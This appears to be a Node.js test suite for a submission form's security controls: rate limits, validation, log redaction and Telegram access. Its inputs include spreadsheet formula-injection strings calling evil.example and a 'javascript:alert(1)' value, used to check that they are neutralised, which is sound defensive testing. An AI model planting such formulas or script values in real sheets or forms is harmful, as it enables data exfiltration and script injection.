const test = require('node:test');
const assert = require('node:assert/strict');
const { harness, payload, attachment, header } = require('./harness.cjs');
const id = n => Number(n).toString(16).padStart(32, '0');
const budget = app => JSON.parse(app.props.SECURITY_DAILY_BUDGET || '{"submissions":0,"bytes":0}');
const noWrites = app => {
  assert.equal(app.state.rows.length, 0);
  assert.equal(app.state.files.length, 0);
  assert.equal(app.state.mails.length, 0);
};

test('global sliding limiter persists across new browser identifiers and stops CAPTCHA calls', () => {
  const app = harness();
  for (let n = 1; n <= 20; n++) assert.equal(app.submit(payload({ clientId: id(n), submissionId: id(n) })).ok, true);
  const result = app.submit(payload({ clientId: id(21), submissionId: id(21) }));
  assert.equal(result.code, 'RATE_LIMITED');
  assert.equal(result.retryAfterSeconds, 60);
  assert.equal(app.state.captcha.length, 0);
  assert.equal(budget(app).submissions, 20);
  app.state.now += 60000;
  assert.equal(app.submit(payload({ clientId: id(21), submissionId: id(21) })).ok, true);
});

test('malformed fields consume global attempt budget without touching CAPTCHA or storage', () => {
  const app = harness();
  for (let n = 0; n < 20; n++) assert.equal(app.submit({}).code, 'INVALID_FIELD');
  assert.equal(app.submit({}).code, 'RATE_LIMITED');
  assert.equal(app.state.captcha.length, 0);
  noWrites(app);
});

test('fresh execution and empty caches retain the persistent global limit', () => {
  const first = harness();
  for (let n = 0; n < 20; n++) first.submit({});
  const restarted = harness({ props: first.props });
  assert.equal(restarted.submit(payload()).code, 'RATE_LIMITED');
  assert.equal(restarted.state.captcha.length, 0);
  noWrites(restarted);
});

test('same browser has one-minute interval and five attempts per rolling hour', () => {
  const app = harness();
  assert.equal(app.submit(payload({ submissionId: id(1) })).ok, true);
  assert.equal(app.submit(payload({ submissionId: id(2) })).code, 'RATE_LIMITED');
  for (let n = 2; n <= 5; n++) {
    app.state.now += 60000;
    assert.equal(app.submit(payload({ submissionId: id(n) })).ok, true);
  }
  app.state.now += 60000;
  assert.equal(app.submit(payload({ submissionId: id(6) })).code, 'RATE_LIMITED');
  app.state.now += 3600000;
  assert.equal(app.submit(payload({ submissionId: id(6) })).ok, true);
});

test('busy lock rejects quickly before calling CAPTCHA and writes', () => {
  const app = harness({ busyLock: true });
  assert.equal(app.submit(payload()).code, 'RATE_LIMITED');
  assert.equal(app.state.captcha.length, 0);
  noWrites(app);
});

test('corrupt persistent limiter and property-service failure fail closed', () => {
  for (const options of [{ props: { SECURITY_RATE_WINDOW: 'broken' } }, { props: { SECURITY_RATE_WINDOW: '{}' } }, { securityPropsFail: true }]) {
    const app = harness(options);
    assert.equal(app.submit(payload()).code, 'PROTECTION_UNAVAILABLE');
    assert.equal(app.state.captcha.length, 0);
    noWrites(app);
  }
});

test('duplicate is acknowledged before all validation, rate, CAPTCHA and daily checks', () => {
  const app = harness();
  const data = payload({ attachments: [attachment()] });
  assert.equal(app.submit(data).ok, true);
  const before = { props: JSON.stringify(app.props), locks: app.state.lockRequests, captcha: app.state.captcha.length };
  const propertyChanges = JSON.stringify(app.props);
  assert.equal(app.submit({ submissionId: data.submissionId }).duplicate, true);
  assert.equal(app.state.lockRequests, before.locks);
  assert.equal(app.state.captcha.length, before.captcha);
  assert.equal(JSON.stringify(app.props), propertyChanges);
  assert.equal(app.state.rows.length, 2);
  assert.equal(app.state.files.length, 1);
  assert.equal(app.state.mails.length, 2);
});

test('receipt lookup never consumes security budgets or performs CAPTCHA verification', () => {
  const app = harness();
  app.submit(payload());
  const before = JSON.stringify(app.props);
  const locks = app.state.lockRequests;
  for (let n = 0; n < 100; n++) assert.equal(app.lookup(payload().submissionId).ok, true);
  assert.equal(JSON.stringify(app.props), before);
  assert.equal(app.state.lockRequests, locks);
  assert.equal(app.state.captcha.length, 0);
});

test('daily 100-submission budget is persistent and resets on project-timezone midnight', () => {
  const app = harness({ props: { SECURITY_DAILY_BUDGET: JSON.stringify({ day: '2026-10-01', submissions: 99, bytes: 0 }) } });
  assert.equal(app.submit(payload({ submissionId: id(1), clientId: id(1) })).ok, true);
  assert.equal(app.submit(payload({ submissionId: id(2), clientId: id(2) })).code, 'DAILY_LIMIT');
  assert.equal(app.state.captcha.length, 0);
  app.state.now = Date.parse('2026-10-01T17:00:00Z');
  assert.equal(app.submit(payload({ submissionId: id(2), clientId: id(2) })).ok, true);
  assert.equal(budget(app).submissions, 1);
  assert.equal(budget(app).day, '2026-10-02');
});

test('daily bytes are charged exactly and blocked before Drive and CAPTCHA work', () => {
  const limit = 200 * 1024 * 1024;
  const app = harness({ props: { SECURITY_DAILY_BUDGET: JSON.stringify({ day: '2026-10-01', submissions: 1, bytes: limit - 3 }) } });
  assert.equal(app.submit(payload({ submissionId: id(1), clientId: id(1), attachments: [attachment()] })).ok, true);
  assert.equal(budget(app).bytes, limit);
  assert.equal(app.submit(payload({ submissionId: id(2), clientId: id(2), attachments: [attachment()] })).code, 'DAILY_LIMIT');
  assert.equal(app.state.files.length, 1);
  assert.equal(app.state.captcha.length, 0);
});

test('refund only confirmed cleanup, keeping reservations for uncertain storage or row writes', () => {
  for (const [options, charged] of [[{ folderFails: true }, false], [{ appendWritesThenFails: true, rows: [header] }, false],
    [{ failCreateAt: 1 }, true], [{ appendWritesThenFails: true, trashFails: true, rows: [header] }, true],
    [{ appendWritesThenFails: true, rows: [header], noFiles: true }, true]]) {
    const app = harness(options);
    assert.equal(app.submit(payload({ attachments: options.noFiles ? [] : [attachment()] })).ok, false);
    assert.equal(budget(app).submissions, charged ? 1 : 0);
  }
});

test('schema rejects forged types, oversize text, wrong consent/enums and weak IDs before verification', () => {
  for (const fields of [{ fullName: {} }, { title: 'x'.repeat(151) }, { email: 'wrong' }, { idea: '\u0000' },
    { consent: 'Нет' }, { consent: true }, { topic: 'Другое' }, { deadline: 'Месяц' }, { participation: 'Да' },
    { submissionId: 'weak' }, { clientId: payload().clientId + '\n' }, { elapsed: '10' },
    { website: {} }, { page: {} }, { materials: 'javascript:alert(1)' }, { surprise: 'value' }]) {
    const app = harness();
    assert.equal(app.submit(payload(fields)).ok, false, JSON.stringify(fields));
    assert.equal(app.state.captcha.length, 0);
    noWrites(app);
  }
});

test('honeypot and too-fast requests never return fake success', () => {
  for (const fields of [{ website: 'robot.example' }, { elapsed: 0 }, { elapsed: 3 }]) {
    const app = harness();
    assert.equal(app.submit(payload(fields)).code, 'INVALID_PAYLOAD');
    noWrites(app);
  }
});

test('body must be JSON object with bounded actual UTF-8 size', () => {
  for (const raw of ['[]', 'null', '{bad', 'text/plain']) {
    const app = harness();
    assert.equal(JSON.parse(app.context.doPost({ postData: { contents: raw } }).getContent()).code, 'INVALID_PAYLOAD');
    noWrites(app);
  }
  const app = harness();
  const raw = 'я'.repeat(8 * 1024 * 1024);
  assert.equal(JSON.parse(app.context.doPost({ postData: { contents: raw } }).getContent()).code, 'PAYLOAD_TOO_LARGE');
  noWrites(app);
});

test('all user-entered row fields neutralize leading formula symbols after trimming', () => {
  for (const prefix of ['=', '+', '-', '@']) {
    const app = harness();
    assert.equal(app.submit(payload({ title: '\t ' + prefix + 'IMPORTXML("https://evil.example")', fullName: prefix + 'name' })).ok, true);
    assert.equal(app.state.rows[1][2], "'" + prefix + 'name');
    assert.equal(app.state.rows[1][4], "'" + prefix + 'IMPORTXML("https://evil.example")');
    assert.equal(typeof app.state.rows[1][0], 'number');
  }
});

test('legacy, archive, executable, SVG and overlong attachment names rejected before CAPTCHA', () => {
  for (const name of ['x.zip', 'x.doc', 'x.xls', 'x.ppt', 'x.exe', 'x.svg', 'x.html', 'x.js', 'a'.repeat(256) + '.pdf']) {
    const app = harness();
    assert.equal(app.submit(payload({ attachments: [attachment(name)] })).code, 'INVALID_FILES');
    assert.equal(app.state.captcha.length, 0);
    noWrites(app);
  }
});

test('logs contain no submitted personal data, files, secret or exception contents', () => {
  const app = harness({ securityPropsFail: true });
  app.submit(payload({ title: 'sensitive-title', fullName: 'sensitive-author', email: 'private@secret.ru', attachments: [attachment('private.pdf', 'private-content')] }));
  const logs = app.state.logs.join('\n');
  assert.match(logs, /PROTECTION_UNAVAILABLE/);
  assert.doesNotMatch(logs, /sensitive|secret|private|local-token|local-secret|payload|base64/);
});

test('Telegram broadcast delivers only to allowlisted active subscribers', () => {
  const app = harness({ props: { TELEGRAM_TOKEN: '1234567890:abcdefghijklmnopqrstuvwxyz', SECURITY_TELEGRAM_ALLOWED_CHAT_IDS: '123, 456' },
    subscribers: [['ID', 'Name', 'Nick', 'Date', 'Status'], ['123', 'Allowed', '', '', 'активен'],
      ['456', 'Stopped', '', '', 'отписан'], ['789', 'Forbidden', '', '', 'активен']] });
  assert.equal(app.submit(payload()).ok, true);
  assert.equal(app.state.telegram.length, 1);
  assert.equal(JSON.parse(app.state.telegram[0].request.payload).chat_id, '123');
});

test('Telegram /last denies unauthorized or inactive chats before reading ideas', () => {
  for (const [allowed, status] of [['', 'активен'], ['123', 'отписан'], ['12', 'активен']]) {
    const app = harness({ props: { TELEGRAM_TOKEN: '1234567890:abcdefghijklmnopqrstuvwxyz', SECURITY_TELEGRAM_ALLOWED_CHAT_IDS: allowed },
      subscribers: [['ID', 'Name', 'Nick', 'Date', 'Status'], ['123', 'Name', '', '', status]] });
    app.context.komandaLast_({ id: 123 });
    assert.equal(app.state.sheetReads, 0);
    assert.equal(app.state.telegram.length, 1);
    assert.doesNotMatch(JSON.parse(app.state.telegram[0].request.payload).text, /docs.google|Последние заявки/);
  }
});

test('Telegram /start cannot join an unapproved chat even with correct invitation password', () => {
  const app = harness({ props: { TELEGRAM_TOKEN: '1234567890:abcdefghijklmnopqrstuvwxyz', TELEGRAM_PAROL: 'invitation', SECURITY_TELEGRAM_ALLOWED_CHAT_IDS: '' } });
  app.context.komandaStart_({ id: 123 }, 'invitation');
  assert.equal(app.state.sheetReads, 0);
  assert.match(JSON.parse(app.state.telegram[0].request.payload).text, /закрыт/);
});

test('allowed active Telegram subscriber retains /last and help does not expose subscriber count', () => {
  const app = harness({ props: { TELEGRAM_TOKEN: '1234567890:abcdefghijklmnopqrstuvwxyz' },
    subscribers: [['ID', 'Name', 'Nick', 'Date', 'Status'], ['123', 'Allowed', '', '', 'активен']] });
  assert.equal(app.submit(payload()).ok, true);
  app.context.komandaLast_({ id: 123 });
  assert.match(JSON.parse(app.state.telegram.at(-1).request.payload).text, /Последние заявки/);
  app.context.komandaHelp_({ id: 999 });
  assert.doesNotMatch(JSON.parse(app.state.telegram.at(-1).request.payload).text, /Всего подписчиков/);
});
